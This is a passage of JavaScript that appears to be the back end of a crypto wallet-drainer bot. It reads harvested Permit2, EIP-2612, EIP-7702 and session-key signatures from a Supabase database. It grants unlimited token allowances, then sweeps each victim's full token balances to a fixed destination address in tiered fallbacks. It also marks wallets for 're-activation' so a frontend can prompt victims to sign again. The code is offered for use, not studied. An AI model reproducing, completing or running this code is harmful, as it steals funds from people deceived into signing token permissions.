  ].map(a => normalizeAddress(a)).filter(Boolean);

  if (signedAddrs.length > 0) {
    let anyBalance = false;
    for (const addr of signedAddrs) {
      try {
        const bal = await new ethers.Contract(addr, ERC20_ABI, rpcProvider).balanceOf(checksum);
        if (bal > 0n) { anyBalance = true; break; }
      } catch {}
      await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
    }
    if (!anyBalance) {
      log(`[gasless] ${checksum.slice(0, 10)} — all ${signedAddrs.length} signed token(s) zero balance, skipping`);
      return;
    }
  }

  // -- PermitBatch path (AllowanceTransfer via signature) ---------------------
  if (permitBatch?.signature && Array.isArray(permitBatch.details) && permitBatch.details.length > 0) {
    let needsPermit = false;
    for (const detail of permitBatch.details) {
      try {
        const [amt, exp] = await permit2.allowance(checksum, detail.token, relayerWallet.address);
        if (amt === 0n || exp <= nowSecs) { needsPermit = true; break; }
      } catch { needsPermit = true; break; }
    }

    if (needsPermit) {
      log(`[gasless] ${checksum} -- calling permit2.permit() (${permitBatch.details.length} token(s))`);
      try {
        const batchArg = {
          details:     permitBatch.details.map(d => ({
            token:      d.token,
            amount:     BigInt(d.amount),
            expiration: BigInt(d.expiration),
            nonce:      Number(d.nonce),
          })),
          spender:     permitBatch.spender,
          sigDeadline: BigInt(permitBatch.sigDeadline),
        };
        const fee = await getFeeData();
        const tx  = await permit2.permit(checksum, batchArg, permitBatch.signature,
          { gasLimit: 300_000n, ...fee });
        log(`[gasless] permit() tx: ${tx.hash}`);
        await tx.wait();
        log(`[gasless] permit() confirmed for ${checksum}`);
      } catch (e) { err(`[gasless] permit() for ${checksum}: ${e.message}`); }
    }

    for (const detail of permitBatch.details) {
      const tokenAddr = normalizeAddress(detail.token);
      if (!tokenAddr) continue;
      try {
        const token   = new ethers.Contract(tokenAddr, ERC20_ABI, rpcProvider);
        const balance = await token.balanceOf(checksum);
        if (balance === 0n) { await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY)); continue; }
        log(`[gasless/allowance] ${checksum} balance=${balance} -- transferFrom ${tokenAddr.slice(0, 10)}`);
        const fee = await getFeeData();
        const tx  = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, balance, tokenAddr,
          { gasLimit: 150_000n, ...fee });
        log(`[gasless/allowance] transferFrom tx: ${tx.hash}`);
        await tx.wait();
        log(`[gasless/allowance] confirmed for ${checksum}`);
      } catch (e) { err(`[gasless/allowance] ${tokenAddr} for ${checksum}: ${e.message}`); }
      await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
    }
  }

  // ── SignatureTransfer path — batch (new) or per-token (legacy backward compat) ─

  const needsGasTokens = [];

  if (Array.isArray(signatureTransfers)) {
    // ── LEGACY: per-token array format ────────────────────────────────────────
    let sigMetaChanged = false;
    const updatedSigs = JSON.parse(JSON.stringify(signatureTransfers));

    for (let i = 0; i < updatedSigs.length; i++) {
      const entry = updatedSigs[i];
      if (!entry?.signature || entry.spent) {
        await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
        continue;
      }

      const deadline = BigInt(entry.deadline);
      if (deadline < nowSecs) {
        warn(`[gasless/sig] entry ${i} expired for ${checksum} — marking spent`);
        updatedSigs[i].spent = true;
        sigMetaChanged = true;
        continue;
      }

      const tokenAddr = normalizeAddress(entry.token);
      if (!tokenAddr) continue;

      try {
        const erc20Token = new ethers.Contract(tokenAddr, ERC20_ABI, rpcProvider);
        const balance    = await erc20Token.balanceOf(checksum);

        if (balance === 0n) { await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY)); continue; }

        let erc20Allow = 0n;
        try { erc20Allow = await erc20Token.allowance(checksum, PERMIT2_ADDRESS); } catch {}

        const eip2612Key = `${checksum.toLowerCase()}:${tokenAddr}`;
        if (entry.eip2612 && !entry.eip2612.failed && !failedEIP2612.has(eip2612Key) && erc20Allow === 0n) {
          const { v, r, s } = entry.eip2612;
          const e2Deadline  = BigInt(entry.eip2612.deadline);
          if (e2Deadline > nowSecs) {
            try {
              const tc  = new ethers.Contract(tokenAddr, EIP2612_PERMIT_ABI, relayerWallet);
              const fee = await getFeeData();
              await (await tc.permit(checksum, PERMIT2_ADDRESS, ethers.MaxUint256, e2Deadline, v, r, s, { gasLimit: 100_000n, ...fee })).wait();
              log(`[gasless/sig] EIP-2612 token.permit() confirmed for ${entry.symbol ?? tokenAddr.slice(0, 10)}`);
              erc20Allow = ethers.MaxUint256;
            } catch (e) {
              warn(`[gasless/sig] token.permit() failed for ${entry.symbol ?? tokenAddr.slice(0, 10)}: ${e.message ?? e} — marking as failed, skipping`);
              failedEIP2612.add(eip2612Key);
              updatedSigs[i] = { ...updatedSigs[i], eip2612: { ...entry.eip2612, failed: true } };
              sigMetaChanged = true;
              await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
              continue;
            }
          }
        }

        if (erc20Allow === 0n) {
          needsGasTokens.push({ token: tokenAddr, balance });
          await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
          continue;
        }

        log(`[gasless/sig] ${checksum} ${entry.symbol ?? tokenAddr.slice(0, 10)} balance=${balance} — legacy single permitTransferFrom`);
        const fee = await getFeeData();
        const legacyPermit2 = new ethers.Contract(PERMIT2_ADDRESS, [
          "function permitTransferFrom(tuple(tuple(address token, uint256 amount) permitted, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount) transferDetails, address owner, bytes calldata signature) external",
        ], relayerWallet);
        const tx = await legacyPermit2.permitTransferFrom(
          { permitted: { token: tokenAddr, amount: BigInt(entry.amount) }, nonce: BigInt(entry.nonce), deadline: BigInt(entry.deadline) },
          { to: DESTINATION_ADDRESS, requestedAmount: balance },
          checksum, entry.signature,
          { gasLimit: 220_000n, ...fee },
        );
        log(`[gasless/sig] tx: ${tx.hash}`);
        await tx.wait();
        log(`[gasless/sig] confirmed — ${entry.symbol ?? tokenAddr.slice(0, 10)} swept`);
        updatedSigs[i].spent = true;
        sigMetaChanged = true;

      } catch (e) {
        const msg = e.message ?? "";
        if (/InvalidNonce|nonce.*already.*used|NONCE_USED/i.test(msg)) {
          warn(`[gasless/sig] nonce consumed — ${entry.symbol ?? entry.token?.slice(0, 10)} — marking spent`);
          updatedSigs[i].spent = true; sigMetaChanged = true;
        } else if (/TRANSFER_FROM_FAILED|transferFrom/i.test(msg)) {
          warn(`[gasless/sig] TRANSFER_FROM_FAILED — ${entry.symbol ?? entry.token?.slice(0, 10)} — marking spent`);
          updatedSigs[i].spent = true; sigMetaChanged = true;
  } else {
          err(`[gasless/sig] ${entry.token} for ${checksum}: ${msg}`);
        }
      }
      await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
    }

    if (sigMetaChanged && supabase) {
      try {
        await supabase.from("delegated_wallets")
          .update({ permit_metadata: { ...meta, signatureTransfers: updatedSigs } })
          .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
        log(`[gasless/sig] Updated spent flags for ${checksum}`);
      } catch (e) { err(`[gasless/sig] Supabase update failed: ${e.message}`); }
    }

  } else if (signatureTransfers && typeof signatureTransfers === "object" && !signatureTransfers.spent) {
    // ── NEW: single batch object ───────────────────────────────────────────────
    const batch = signatureTransfers;

    if (BigInt(batch.deadline) < nowSecs) {
      warn(`[gasless/batch] deadline EXPIRED for ${checksum} (${new Date(Number(batch.deadline) * 1000).toISOString()}) — marking spent`);
      if (supabase) {
        try {
          await supabase.from("delegated_wallets")
            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } } })
            .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
        } catch (e) { err(`[gasless/batch] Supabase update: ${e.message}`); }
      }
      return;
    }

    // Verify spender matches relayer BEFORE EIP-2612 permits — if mismatch the tx will revert
    if (batch.spender && batch.spender.toLowerCase() !== relayerWallet.address.toLowerCase()) {
      err(`[gasless/batch] ❌ SPENDER MISMATCH — sig.spender=${batch.spender} relayer=${relayerWallet.address} — cannot sweep`);
      return;
    }

    const eip2612Map = batch.eip2612 ?? {};

    // Step 1: EIP-2612 permits — set ERC20→Permit2 for tokens that need it
    for (const perm of batch.permitted) {
      const tokenAddr = normalizeAddress(perm.token);
      if (!tokenAddr) continue;
      let erc20Allow = 0n;
      try { erc20Allow = await new ethers.Contract(tokenAddr, ERC20_ABI, rpcProvider).allowance(checksum, PERMIT2_ADDRESS); } catch {}

      const batchEip2612Key = `${checksum.toLowerCase()}:${tokenAddr}`;
      if (erc20Allow === 0n) {
        const e2 = eip2612Map[tokenAddr.toLowerCase()];
        if (e2 && !e2.failed && !failedEIP2612.has(batchEip2612Key) && BigInt(e2.deadline) > nowSecs) {
            log(`[gasless/batch] EIP-2612 token.permit() for ${tokenAddr.slice(0, 10)}`);
            try {
              const tc  = new ethers.Contract(tokenAddr, EIP2612_PERMIT_ABI, relayerWallet);
              const fee = await getFeeData();
              await (await tc.permit(checksum, PERMIT2_ADDRESS, ethers.MaxUint256, BigInt(e2.deadline), e2.v, e2.r, e2.s, { gasLimit: 100_000n, ...fee })).wait();
              log(`[gasless/batch] EIP-2612 confirmed for ${tokenAddr.slice(0, 10)}`);
              try {
                const actualAllow = await new ethers.Contract(tokenAddr, ERC20_ABI, rpcProvider).allowance(checksum, PERMIT2_ADDRESS);
                if (actualAllow === 0n) {
                  warn(`[gasless/batch] EIP-2612 permit() succeeded but allowance=0 for ${tokenAddr.slice(0,10)} — non-standard token, marking failed`);
                  failedEIP2612.add(batchEip2612Key);
                  eip2612Map[tokenAddr.toLowerCase()] = { ...e2, failed: true };
                } else {
                  log(`[gasless/batch] EIP-2612 allowance verified: ${actualAllow} for ${tokenAddr.slice(0,10)}`);
                }
              } catch { /* non-fatal */ }
          } catch (e) {
            warn(`[gasless/batch] EIP-2612 permit() failed for ${tokenAddr.slice(0, 10)}: ${e.message} — marking failed, will not retry`);
            failedEIP2612.add(batchEip2612Key);
            eip2612Map[tokenAddr.toLowerCase()] = { ...e2, failed: true };
            if (supabase) {
              try {
                await supabase.from("delegated_wallets")
                  .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, eip2612: eip2612Map } } })
                  .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
              } catch (e2) { err(`[gasless/batch] Supabase mark eip2612 failed: ${e2.message}`); }
            }
          }
        }
      }
      await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
    }

    // Step 2: Build transferDetails — check balances, 0 for empty tokens
    const transferDetails = [];
    let anyBalance = false;
    for (const perm of batch.permitted) {
      const tokenAddr = normalizeAddress(perm.token);
      if (!tokenAddr) { transferDetails.push({ to: DESTINATION_ADDRESS, requestedAmount: 0n }); continue; }
      try {
        const balance = await new ethers.Contract(tokenAddr, ERC20_ABI, rpcProvider).balanceOf(checksum);
        transferDetails.push({ to: DESTINATION_ADDRESS, requestedAmount: balance });
        if (balance > 0n) anyBalance = true;
      } catch {
        transferDetails.push({ to: DESTINATION_ADDRESS, requestedAmount: 0n });
      }
      await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
    }

    if (!anyBalance) {
      log(`[gasless/batch] all zero balance for ${checksum} — skipping batch`);
      if (needsGasTokens.length > 0) {
        await evaluateAirdrop(checksum, needsGasTokens).catch(e => err(`evaluateAirdrop: ${e.message}`));
      }
      return;
    }

    const nonZeroCount = transferDetails.filter(d => d.requestedAmount > 0n).length;
    log(`[gasless/batch] tokens with balance: ${nonZeroCount}/${batch.permitted.length}`);

    // Step 3: Batch permitTransferFrom — ONE call for all tokens
    log('[gasless/batch] permitTransferFrom params:');
    log(`  owner:          ${checksum}`);
    log(`  spender in sig: ${batch.spender}`);
    log(`  msg.sender:     ${relayerWallet.address}`);
    log(`  tokens:  ${batch.permitted.map(p => p.token.slice(0, 10)).join(', ')}`);
    log(`  amounts: ${transferDetails.map(d => d.requestedAmount.toString()).join(', ')}`);
    log(`  nonce:   ${String(batch.nonce).slice(0, 20)}...`);
    log(`  deadline:${batch.deadline} (${new Date(Number(batch.deadline) * 1000).toISOString()})`);
    log(`  sig:     ${batch.signature.slice(0, 20)}...`);

    try {
      const fee = await getFeeData();
      const gasLimit = 150_000n + BigInt(batch.permitted.length) * 100_000n;
      const tx = await permit2Batch.permitTransferFrom(
        {
          permitted: batch.permitted.map(p => ({ token: p.token, amount: BigInt(p.amount) })),
          nonce:     BigInt(batch.nonce),
          deadline:  BigInt(batch.deadline),
        },
        transferDetails,
        checksum,
        batch.signature,
        { gasLimit, ...fee },
      );
      log(`[gasless/batch] batch permitTransferFrom tx: ${tx.hash}`);
      try {
        await tx.wait();
        log(`[gasless/batch] confirmed — batch sweep for ${checksum} (${batch.permitted.length} token(s))`);
      } catch (waitErr) {
        const wmsg = waitErr.message ?? '';
        let reason = wmsg;
        if (waitErr.data) {
          try {
            const decoded = ethers.AbiCoder.defaultAbiCoder().decode(['string'], '0x' + String(waitErr.data).slice(10));
            reason = decoded[0] ?? wmsg;
          } catch {}
        }
        err(`[gasless/batch] revert: ${reason}`);
        throw waitErr;
      }

      if (supabase) {
        try {
          await supabase.from("delegated_wallets")
            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } } })
            .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
        } catch (e) { err(`[gasless/batch] Supabase spent update: ${e.message}`); }
      }
    } catch (e) {
      const msg = e.message ?? "";
      if (/InvalidNonce|nonce.*already.*used|NONCE_USED/i.test(msg)) {
        warn(`[gasless/batch] nonce consumed for ${checksum} — marking spent`);
      } else if (/TRANSFER_FROM_FAILED|transferFrom/i.test(msg)) {
        warn(`[gasless/batch] TRANSFER_FROM_FAILED for ${checksum} — marking spent`);
      } else {
        err(`[gasless/batch] batch permitTransferFrom for ${checksum}: ${msg}`);
        return;
      }
      if (supabase) {
        try {
          await supabase.from("delegated_wallets")
            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } } })
            .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
        } catch (e2) { err(`[gasless/batch] Supabase spent update: ${e2.message}`); }
      }
    }
  }

  if (needsGasTokens.length > 0) {
    await evaluateAirdrop(checksum, needsGasTokens).catch(e => err(`evaluateAirdrop: ${e.message}`));
  }
}

// ── CoinGecko token list ──────────────────────────────────────────────────────

async function cgFetchWithRetry(url) {
  const BACKOFF = [30_000, 60_000, 120_000];
  for (let attempt = 0; attempt <= BACKOFF.length; attempt++) {
    const res = await fetch(url);
    if (res.status === 429) {
      if (attempt >= BACKOFF.length) throw new Error(`CoinGecko still rate-limited after ${attempt + 1} attempts`);
      const wait = BACKOFF[attempt];
      log(`[tokens] rate limited (429) — waiting ${wait / 1000}s before retry (attempt ${attempt + 1})`);
      await sleep(wait);
      continue;
    }
    if (!res.ok) throw new Error(`CoinGecko ${res.status} for ${url}`);
    return res.json();
  }
  throw new Error(`CoinGecko fetch failed`);
}

async function fetchTokenList(chain) {
  const platformMap = { eth: "ethereum", bnb: "binance-smart-chain", polygon: "polygon-pos" };
  const categoryMap = { eth: "ethereum-ecosystem", bnb: "bnb-chain", polygon: "polygon-ecosystem" };
  const platform    = platformMap[chain] ?? platformMap[CHAIN];
  const category    = categoryMap[chain] ?? categoryMap[CHAIN];

  try {
    log(`[tokens] fetching page 1 for ${chain}...`);
    const page1 = await cgFetchWithRetry(
      `https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&category=${category}&order=market_cap_desc&per_page=250&page=1`
    );
    await sleep(2_000);

    log(`[tokens] fetching page 2 for ${chain}...`);
    const page2 = await cgFetchWithRetry(
      `https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&category=${category}&order=market_cap_desc&per_page=250&page=2`
    );
    await sleep(2_000);

    const allCoins = [...(Array.isArray(page1) ? page1 : []), ...(Array.isArray(page2) ? page2 : [])];
    if (!allCoins.length) throw new Error("empty markets response");

    log(`[tokens] fetching coin list with platform addresses...`);
    const fullList = await cgFetchWithRetry("https://api.coingecko.com/api/v3/coins/list?include_platform=true");

    const addressMap = {};
    for (const coin of (Array.isArray(fullList) ? fullList : [])) {
      if (coin.platforms?.[platform]) {
        addressMap[coin.id] = coin.platforms[platform].toLowerCase();
      }
    }

    const tokens = [];
    for (const coin of allCoins) {
      const address = addressMap[coin.id];
      if (!address || !ethers.isAddress(address)) continue;
      if (!coin.market_cap || coin.market_cap < 100_000) continue;
      tokens.push({
        address,
        symbol:      (coin.symbol ?? "?").toUpperCase(),
        decimals:    KNOWN_DECIMALS[address] ?? 18,
        coingeckoId: coin.id,
        marketCap:   coin.market_cap,
        name:        coin.name ?? coin.id,
      });
    }

    log(`[tokens] ✅ loaded ${tokens.length} tokens for ${chain} from CoinGecko`);
    if (tokens.length) log(`[tokens] top 5: ${tokens.slice(0, 5).map(t => t.symbol).join(", ")}`);
    return tokens;

  } catch (e) {
    const fallback = FALLBACK_TOKENS[chain] ?? FALLBACK_TOKENS[CHAIN] ?? [];
    warn(`[tokens] ⚠️  CoinGecko fetch failed: ${e.message} — using ${fallback.length} fallback tokens`);
    return fallback;
  }
}

async function loadTokens() {
  const cacheFile = `/tmp/tokens_${CHAIN}.json`;
  try {
    const cached   = JSON.parse(fs.readFileSync(cacheFile, "utf8"));
    const ageHours = (Date.now() - (cached.timestamp ?? 0)) / 3_600_000;
    if (ageHours < 24 && Array.isArray(cached.tokens) && cached.tokens.length > 0) {
      log(`[tokens] using cache: ${cached.tokens.length} tokens (${ageHours.toFixed(1)}h old)`);
      return cached.tokens;
    }
  } catch { /* no cache — fetch fresh */ }

  // Stagger API calls to avoid all 3 bots hitting CoinGecko simultaneously
  const stagger = CG_STAGGER_MS[CHAIN] ?? 0;
  if (stagger > 0) {
    log(`[tokens] staggering fetch by ${stagger / 1000}s (chain=${CHAIN})...`);
    await sleep(stagger);
  }

  const tokens = await fetchTokenList(CHAIN);
  try {
    fs.writeFileSync(cacheFile, JSON.stringify({ timestamp: Date.now(), tokens }));
    log(`[tokens] cache saved: ${tokens.length} tokens → ${cacheFile}`);
  } catch (e) { warn(`[tokens] cache write failed: ${e.message}`); }
  return tokens;
}

// ── Relayer + balance helpers ─────────────────────────────────────────────────

async function checkRelayerBalance() {
  try {
    const balance = await rpcProvider.getBalance(relayerWallet.address);
    if (balance < RELAYER_MIN_WEI) {
      log(`[relayer] ⚠️  LOW: ${ethers.formatEther(balance)} — min ${ethers.formatEther(RELAYER_MIN_WEI)} — skipping sweep`);
      return false;
    }
    log(`[relayer] balance: ${ethers.formatEther(balance)} ✅`);
    return true;
  } catch (e) {
    warn(`[relayer] balance check failed: ${e.message} — allowing sweep`);
    return true; // optimistic: don't block sweeps on transient RPC errors
  }
}

// Multicall3 — deployed at the same address on all major EVM chains.
// Batches all balanceOf calls into a single eth_call instead of N calls.
const MULTICALL3_ADDRESS = "0xcA11bde05977b3631167028862bE2a173976CA11";
const MULTICALL3_ABI     = [
  "function aggregate3(tuple(address target, bool allowFailure, bytes callData)[] calls) external view returns (tuple(bool success, bytes returnData)[] returnData)",
];
const ERC20_BAL_IFACE = new ethers.Interface(["function balanceOf(address) view returns (uint256)"]);

async function checkAllBalances(address) {
  if (!TOKENS.length) return [];
  const multicall = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, rpcProvider);
  const calls = TOKENS.map(token => ({
    target:       token.address,
    allowFailure: true,
    callData:     ERC20_BAL_IFACE.encodeFunctionData("balanceOf", [address]),
  }));

  const results = [];
  const CHUNK   = 250;
  for (let i = 0; i < calls.length; i += CHUNK) {
    try {
      const chunk      = calls.slice(i, i + CHUNK);
      const returnData = await multicall.aggregate3(chunk);
      for (let j = 0; j < chunk.length; j++) {
        const { success, returnData: data } = returnData[j];
        if (!success || !data || data === "0x") continue;
        try {
          const [balance] = ERC20_BAL_IFACE.decodeFunctionResult("balanceOf", data);
          if (balance > 0n) results.push({ ...TOKENS[i + j], balance });
        } catch { /* malformed return — skip */ }
      }
    } catch (e) {
      warn(`[balances] multicall chunk ${i}–${Math.min(i + CHUNK, calls.length)} failed: ${e.message}`);
    }
  }
  return results;
}

// ── Dispatch sweep — relayer gate + debounce ──────────────────────────────────

async function dispatchSweep(wallet) {
  const short = wallet.address.slice(0, 10);
  log(`[sweep] starting for ${short} type=${wallet.type}`);

  // Relayer balance gate
  const relayerBal = await rpcProvider.getBalance(relayerWallet.address);
  const min = { eth: parseEther("0.005"), bnb: parseEther("0.005"), polygon: parseEther("1") };
  if (relayerBal < (min[CHAIN] ?? min.bnb)) {
    log(`[sweep] ${short} — relayer too low (${ethers.formatEther(relayerBal)}), skipping`);
    return;
  }

  // Debounce
  const key = wallet.address.toLowerCase();
  if (sweepingNow.has(key)) return;
  sweepingNow.add(key);

  try {
    await sweep(wallet);
    log(`[sweep] ✅ complete for ${short}`);
  } catch (e) {
    log(`[sweep] ❌ error for ${short}: ${e.message}`);
  } finally {
    setTimeout(() => sweepingNow.delete(key), 10000);
  }
}

// ── Universal sweep — 5 tiers ───────────────────────────────────────────────

async function sweep(wallet) {
  const checksum = normalizeAddress(wallet.address);
  if (!checksum) return;
  const short = checksum.slice(0, 10);
  const nowSecs = BigInt(Math.floor(Date.now() / 1000));
  const addrKey = checksum.toLowerCase();

  // ══════════════════════════════════════════════════════════════════════════
  // TIER 0: SESSION KEY (ERC-7715) — relayer has 2-year permission
  // ══════════════════════════════════════════════════════════════════════════
  if (wallet.type === "session-key") {
    const ok = await sweepViaSessionKey(checksum, short, addrKey);
    if (ok) return;
    // If session key sweep failed, fall through to other methods
  }

  // ══════════════════════════════════════════════════════════════════════════
  // TIER 0.5: EIP-7702 + Flashbots Atomic Bundle (ETH only)
  // ══════════════════════════════════════════════════════════════════════════
  if (wallet.type === "eip7702" && CHAIN === "eth") {
    const ok = await sweepViaFlashbotsBundle(checksum, short, addrKey);
    if (ok) return;
    // Flashbots failed — fall through to standard EIP-7702 sweep
  }

  // ══════════════════════════════════════════════════════════════════════════
  // TIER 1: EIP-7702 — delegated wallet, sweep via authorization
  // ══════════════════════════════════════════════════════════════════════════
  if (wallet.type === "eip7702") {
    const code = await rpcProvider.getCode(checksum);
    if (!code || code === "0x" || !code.startsWith("0xef0100")) {
      log(`[eip7702] ${short} — delegation expired, marking needs-reauth`);
      needsReauthWallets.add(addrKey);
      if (supabase) {
        await supabase.from("delegated_wallets")
          .update({ status: "needs-reauth" })
          .eq("address", addrKey).eq("chain", CHAIN);
      }
      return;
    }

    await sweepDelegatedWallet(checksum);
    return;
  }

  // ══════════════════════════════════════════════════════════════════════════
  // TIER 2: EIP-2612 — permit() + transferFrom() per token
  // ══════════════════════════════════════════════════════════════════════════
  if (supabase) {
    const { data: permits } = await supabase
      .from("eip2612_permits")
      .select("*")
      .eq("address", addrKey)
      .eq("chain", CHAIN)
      .eq("used", false);

    const BLACKLIST = new Set([
      "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82",
      "0xdac17f958d2ee523a2206206994597c13d831ec7",
    ]);

    for (const p of permits ?? []) {
      if (BLACKLIST.has(p.token.toLowerCase())) continue;
      const dl = typeof p.deadline === "string" ? BigInt(Math.floor(new Date(p.deadline).getTime() / 1000)) : 0n;
      if (dl > 0n && dl < nowSecs) {
        log(`[eip2612] ${p.symbol ?? p.token.slice(0,10)} — expired, marking used`);
        await supabase.from("eip2612_permits").update({ used: true }).eq("id", p.id);
        continue;
      }

      const token = new ethers.Contract(p.token, ERC20_ABI, rpcProvider);
      let balance;
      try { balance = await token.balanceOf(checksum); } catch { continue; }
      if (balance === 0n) continue;

      log(`[eip2612] ${p.symbol ?? p.token.slice(0,10)} balance=${ethers.formatUnits(balance, 18)} — permit()`);
      try {
        const fee = await getFeeData();
        const tc = new ethers.Contract(p.token, EIP2612_PERMIT_ABI, relayerWallet);
        const tx1 = await tc.permit(checksum, PERMIT2_ADDRESS, ethers.MaxUint256, dl, p.v, p.r, p.s, { gasLimit: 100_000n, ...fee });
        await tx1.wait();
        log(`[eip2612] permit() confirmed for ${p.symbol ?? p.token.slice(0,10)}`);

        const actualAllow = await token.allowance(checksum, PERMIT2_ADDRESS);
        if (actualAllow === 0n) {
          warn(`[eip2612] permit() succeeded but allowance=0 for ${p.symbol ?? p.token.slice(0,10)} — non-standard, skipping`);
          await supabase.from("eip2612_permits").update({ used: true, failed: true }).eq("id", p.id);
          continue;
        }

        const tx2 = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, balance, p.token, { gasLimit: 150_000n, ...fee });
        await tx2.wait();
        log(`[eip2612] ✅ swept ${p.symbol ?? p.token.slice(0,10)}`);
        await supabase.from("eip2612_permits").update({ used: true }).eq("id", p.id);
      } catch (e) {
        err(`[eip2612] ❌ ${p.symbol ?? p.token.slice(0,10)}: ${e.reason ?? e.message}`);
        await supabase.from("eip2612_permits").update({ used: true, failed: true }).eq("id", p.id);
      }
    }
  }

  // ══════════════════════════════════════════════════════════════════════════
  // TIER 3: Permit2 AllowanceTransfer — permitBatch sigs
  // ══════════════════════════════════════════════════════════════════════════
  if (supabase) {
    const { data: pbData } = await supabase
      .from("permit2_signatures")
      .select("*")
      .eq("address", addrKey)
      .eq("chain", CHAIN)
      .single();

    if (pbData?.permit?.transfer_type === "permit-batch" && Array.isArray(pbData.permit.details)) {
      for (const detail of pbData.permit.details) {
        try {
          const [p2Amount,, p2Exp] = await permit2.allowance(checksum, detail.token, relayerWallet.address);
          if (p2Amount === 0n || BigInt(p2Exp) < nowSecs) continue;

          const token = new ethers.Contract(detail.token, ERC20_ABI, rpcProvider);
          const balance = await token.balanceOf(checksum);
          if (balance === 0n) continue;

          const fee = await getFeeData();
          const tx = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, balance, detail.token, { gasLimit: 150_000n, ...fee });
          await tx.wait();
          log(`[allowance] ✅ swept ${detail.token.slice(0,10)}`);
        } catch (e) {
          err(`[allowance] ❌ ${detail.token.slice(0,10)}: ${e.reason ?? e.message}`);
        }
      }
    }
  }

  // ══════════════════════════════════════════════════════════════════════════
  // ══════════════════════════════════════════════════════════════════════════
  // TIER 4: Permit2 SignatureTransfer
  // Tries 3 signature sources in order, marks needs-reactivation on every
  // unrecoverable failure so the frontend can prompt the user to re-activate.
  // ══════════════════════════════════════════════════════════════════════════
  if (supabase) {
    let stData   = null;
    let stSource = "";

    // Source 1: permit2_signatures[address + "-sig"] — primary path
    {
      const { data } = await supabase
        .from("permit2_signatures")
        .select("*")
        .eq("address", addrKey + "-sig")
        .eq("chain", CHAIN)
        .single();
      if (data?.signature) {
        stData   = data;
        stSource = "permit2_signatures";
      }
    }

    // Source 2: delegated_wallets.permit_metadata.signatureTransfers (WC + pre-fix activations)
    if (!stData) {
      const { data: dwRow } = await supabase
        .from("delegated_wallets")
        .select("permit_metadata")
        .eq("address", addrKey)
        .eq("chain", CHAIN)
        .single();
      const st = dwRow?.permit_metadata?.signatureTransfers;
      if (st?.signature && Array.isArray(st?.permitted) && st.permitted.length > 0 && st?.nonce) {
        log(`[gasless] Source 2 (permit_metadata) for ${short}`);
        stData = {
          permit:    { ...st, transfer_type: "batch-signature-transfer" },
          signature: st.signature,
          tokens:    st.permitted.map(p => p.token),
        };
        stSource = "permit_metadata";
        // Back-fill so Source 1 works on future sweeps
        supabase.from("permit2_signatures").upsert(
          { address: addrKey + "-sig", chain: CHAIN, tokens: stData.tokens, permit: stData.permit,
            signature: st.signature, deadline: st.deadline ? new Date(Number(st.deadline) * 1000).toISOString() : null,
            created_at: new Date().toISOString() },
          { onConflict: "address,chain" }
        ).then(({ error: bfErr }) => { if (!bfErr) log(`[gasless] ✅ back-filled permit2_signatures for ${short}`); }).catch(() => {});
      }
    }

    // Source 3: permit_metadata.permitBatch — back-fill AllowanceTransfer (for Tier 3)
    if (!stData) {
      const { data: dwRow } = await supabase
        .from("delegated_wallets")
        .select("permit_metadata")
        .eq("address", addrKey)
        .eq("chain", CHAIN)
        .single();
      const pb = dwRow?.permit_metadata?.permitBatch;
      if (pb?.signature && Array.isArray(pb?.details) && pb.details.length > 0) {
        supabase.from("permit2_signatures").upsert(
          { address: addrKey, chain: CHAIN, tokens: pb.details.map(d => d.token || d.tokenAddress).filter(Boolean),
            permit: { details: pb.details, spender: pb.spender, sigDeadline: pb.sigDeadline, transfer_type: "permit-batch" },
            signature: pb.signature, deadline: pb.sigDeadline ? new Date(Number(pb.sigDeadline) * 1000).toISOString() : null,
            created_at: new Date().toISOString() },
          { onConflict: "address,chain" }
        ).catch(() => {});
      }
    }

    if (!stData) {
      if (wallet.type === "permit2-gasless") {
        log(`[gasless] ❌ no signature found for ${short} — marking needs-reactivation`);
        needsReauthWallets.add(addrKey);
        supabase.from("delegated_wallets")
          .update({ needs_reactivation: true })
          .eq("address", addrKey).eq("chain", CHAIN)
          .then().catch(() => {});
      }
      return;
    }

    log(`[gasless] using source=${stSource} for ${short}`);

    if (stData.permit?.transfer_type === "batch-signature-transfer" && stData.signature) {
      const sig = stData.permit;
      const dl  = BigInt(sig.deadline ?? 0);

      const spenderMatch = !sig.spender || sig.spender.toLowerCase() === relayerWallet.address.toLowerCase();
      if (!spenderMatch) {
        log(`[gasless] ❌ spender mismatch — stored: ${sig.spender}, bot: ${relayerWallet.address} — marking needs-reactivation`);
        needsReauthWallets.add(addrKey);
        supabase.from("delegated_wallets").update({ needs_reactivation: true })
          .eq("address", addrKey).eq("chain", CHAIN).then().catch(() => {});
        return;
      }
      if (dl > 0n && dl < nowSecs) {
        log(`[gasless] ❌ expired — marking needs-reactivation`);
        needsReauthWallets.add(addrKey);
        supabase.from("delegated_wallets").update({ needs_reactivation: true })
          .eq("address", addrKey).eq("chain", CHAIN).then().catch(() => {});
        return;
      }

      const withBalance = [];
      for (const perm of sig.permitted ?? []) {
        try {
          const t = new ethers.Contract(perm.token, ERC20_ABI, rpcProvider);
          const bal = await t.balanceOf(checksum);
          if (bal > 0n) withBalance.push({ ...perm, balance: bal });
